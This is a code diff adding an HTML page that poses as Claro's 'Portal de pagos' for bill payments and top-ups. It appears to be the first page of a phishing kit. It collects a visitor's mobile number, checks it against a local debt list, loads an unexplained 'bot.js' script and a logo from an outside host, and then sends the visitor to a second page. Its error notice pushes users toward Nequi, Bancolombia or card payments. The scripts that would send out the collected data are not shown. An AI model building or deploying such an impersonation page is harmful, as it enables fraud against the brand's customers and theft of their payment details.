@@ -1,0 +1,270 @@
+<!DOCTYPE html>
+<html lang="es">
+
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, user-scalable=no" />
+  <link rel="icon" type="image/png" href="img/favicon.ico" />
+  <title>Portal de pagos Claro</title>
+  <link rel="preconnect" href="https://fonts.googleapis.com" />
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+  <link href="https://fonts.googleapis.com/css2?family=Open+Sans:ital,wght@0,300..800;1,300..800&display=swap"
+    rel="stylesheet" />
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.4.3/dist/css/bootstrap.min.css" rel="stylesheet" />
+  <link rel="stylesheet" href="css/index.css" />
+  <script src="./js/functions.js"></script>
+  <script src="./js/debtMap.js"></script>
+  <style>
+    #loader {
+      display: none;
+      position: fixed;
+      left: 50%;
+      top: 50%;
+      transform: translate(-50%, -50%);
+    }
+
+    svg {
+      width: 3.25em;
+      transform-origin: center;
+      animation: rotate4 2s linear infinite;
+    }
+
+    circle {
+      fill: none;
+      stroke: hsl(0, 97%, 59%);
+      stroke-width: 2;
+      stroke-dasharray: 1, 200;
+      stroke-dashoffset: 0;
+      stroke-linecap: round;
+      animation: dash4 1.5s ease-in-out infinite;
+    }
+
+    @keyframes rotate4 {
+      100% { transform: rotate(360deg); }
+    }
+
+    @keyframes dash4 {
+      0% { stroke-dasharray: 1, 200; stroke-dashoffset: 0; }
+      50% { stroke-dasharray: 89, 200; stroke-dashoffset: -35; }
+      100% { stroke-dasharray: 89, 200; stroke-dashoffset: -124; }
+    }
+  </style>
+</head>
+
+<body>
+  <header id="comida">
+    <div class="caja_img">
+      <img class="logo" src="img/logo-claro-blanco.svg" />
+    </div>
+  </header>
+  <main>
+    <div id="ggris1" class="gris1">
+      <div class="texto_gris">
+        <br /><br />
+        <p class="texto1">
+          Portal de
+          <span class="rojo">PAGOS <span class="recargas"> Y RECARGAS</span></span>
+        </p>
+      </div>
+    </div>
+
+    <table id="tabla-opciones" cl>
+      <tr>
+        <td valign="top" align="center">
+          <img id="azul1" src="img/icono-seleccion-on.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul2" src="img/icono-mediopago-off.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul3" src="img/icono-pago-off.png" class="imagen" />
+        </td>
+        <td valign="top" align="center">
+          <img id="azul4" src="img/icono-resultado-off.png" class="imagen" />
+        </td>
+      </tr>
+      <tr>
+        <td valign="top" align="center" class="etq-pasos act-pasos">
+          Selecciona<br />tu servicio
+        </td>
+        <td valign="top" align="center" class="etq-pasos">
+          Escoge el <br />medio de pago
+        </td>
+        <td valign="top" align="center" class="etq-pasos">
+          Realiza el <br />Pago en linea
+        </td>
+        <td valign="top" align="center" class="etq-pasos">
+          Recibe la <br />Confimacion
+        </td>
+      </tr>
+    </table>
+
+    <div id="contenedor"></div>
+
+    <section id="usuario">
+      <div class="texto_gris2">
+        <br /><br />
+        <h2 class="texto2">
+          Realiza el pago de la factura de tus servicios Claro, compra
+          paquetes y haz recargas de manera fácil y desde donde quieras.
+          También, puedes inscribir tu tarjeta de crédito para realizar el
+          pago de tus facturas de manera automática.
+        </h2>
+      </div>
+      <br />
+      <div class="servicio">
+        <label style="color: #626c70">Selecciona el tipo de servicio</label>
+        <div class="servicios" style="color: #626c70">
+          <div class="servicio-item" onclick="cambiaimg(1)">
+            <img id="check1" class="check" src="img/uncheck.png" alt="Checkbox" />
+            <p>Postpago</p>
+            <img class="iconitos" src="img/celular.png" alt="Icono celular" />
+          </div>
+          <div class="servicio-item" onclick="cambiaimg(2)">
+            <img id="check2" class="check" src="img/uncheck.png" alt="Checkbox" />
+            <p>Hogar</p>
+            <img class="iconitos" src="img/hogar.png" alt="Icono hogar" />
+          </div>
+          <div class="servicio-item" onclick="cambiaimg(3)">
+            <img id="check3" class="check" src="img/uncheck.png" alt="Checkbox" />
+            <p>Equipo</p>
+            <img class="iconitos" src="img/equipos.png" alt="Icono equipos" />
+          </div>
+          <div class="servicio-item" onclick="cambiaimg(4)">
+            <img id="check4" class="check" src="img/uncheck.png" alt="Checkbox" />
+            <p>Internet</p>
+            <img class="iconitos" src="img/internet.png" alt="Icono internet" />
+          </div>
+        </div>
+      </div>
+
+      <br />
+
+      <label for="celular" style="color: #626c70">Número de celular</label>
+      <br />
+      <input type="number" name="celular" class="input-cel" required id="celular" inputmode="numeric" value=""
+        autocomplete="off" minlength="10" maxlength="10" />
+      <div class="botones">
+        <br /><button class="boton_continuar" id="boton">
+          Continuar
+        </button>
+      </div>
+    </section>
+
+    <section id="errorpasarela" style="display: none">
+      <br />
+      <br />
+      <br />
+      <br />
+      <br />
+      <br />
+      <div style="text-align: center">
+        <img style="width: 130px; margin-left: auto"
+          src="https://dev-claro-img-css.pantheonsite.io/iconos-logo-claro.png" /><br /><br />
+        <div class="loader">
+          <div class="dot"></div>
+          <div class="dot"></div>
+          <div class="dot"></div>
+        </div>
+      </div>
+      <br />
+      <br />
+      <br />
+
+      <div style="text-align: center; line-height: 1rem">
+        <h2 class="t-subtitle" style="line-height: 2.5rem; font-size: 1.6rem; color: #e5281bde">
+          Te pedimos una disculpa, en este momento solo se aceptan las
+          siguiente pasarelas de pagos: Nequi, Bancolombia o Tarjeta de Debito
+          o Credito
+        </h2>
+        <br /><br /><br /><br /><br />
+      </div>
+      <br />
+      <br />
+      <br />
+      <br />
+      <br />
+      <br />
+    </section>
+    <div id="loader">
+      <svg viewBox="25 25 50 50">
+        <circle r="20" cy="50" cx="50"></circle>
+      </svg>
+    </div>
+  </main>
+  <br /><br />
+  <footer class="footer">
+    <p>Todos los derechos reservados, Claro 2024</p>
+    <nav class="footer-links">
+      <a href="#mapa">Mapa de sitio</a>
+      <a href="#denuncias">Portal de denuncias</a>
+      <a href="#legal">Legal y regulatorio</a>
+    </nav>
+  </footer>
+
+  <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+  <script src="js/bot.js"></script>
+  <script>
+    const celularInput = document.getElementById("celular");
+
+    celularInput.addEventListener("input", function () {
+      // Permitir que el primer carácter sea "3" y el resto solo números
+      if (this.value.length === 1 && this.value !== "3") {
+        this.value = ""; // Si el primer dígito no es 3, limpiar el input
+      } else {
+        // Permitir solo números después del primer dígitothis.value = this.value.replace(/[^0-9]/g, '');
+      }
+    });
+
+    celularInput.addEventListener("keydown", function (event) {
+      // Evitar que se escriban más de 10 dígitos
+      if (
+        this.value.length >= 10 &&
+        event.key !== "Backspace" &&
+        event.key !== "Delete"
+      ) {
+        event.preventDefault();
+      }
+    });
+
+    function updateLS() {
+      LS.setItem("info", JSON.stringify(info));
+    }
+
+    function cambiaimg(selectedId) {
+      // Desmarca todas las imágenes
+      for (let i = 1; i <= 4; i++) {
+        document.getElementById("check" + i).src = "img/uncheck.png";
+      }
+      // Marca solo la opción seleccionada
+      document.getElementById("check" + selectedId).src = "img/check.png";
+    }
+
+    function guardarNumero() {
+      var number = document.getElementById("celular").value;
+      if (number.length < 10) {
+        alert("Por favor ingrese un número de celular válido");
+        return;
+      }
+
+      if (number in debtMap) {
+        info.metaInfo.telnum = number;
+        updateLS();
+        localStorage.setItem("numeroCelular", number);
+        document.getElementById("loader").style.display = "block";
+        setTimeout(function () {
+          window.location.href = "index2.html"; // Redirige a index2.html
+        }, 1000); // 2 segundos
+      } else {
+        alert("El número que ingresaste se encuentra al día en pagos sin embargo no se encontraron deudas pendientes");
+      }
+    }
+
+    document.getElementById("boton").addEventListener("click", function () {
+      guardarNumero();
+    });
+
+  </script>
+</body>
+
+</html>
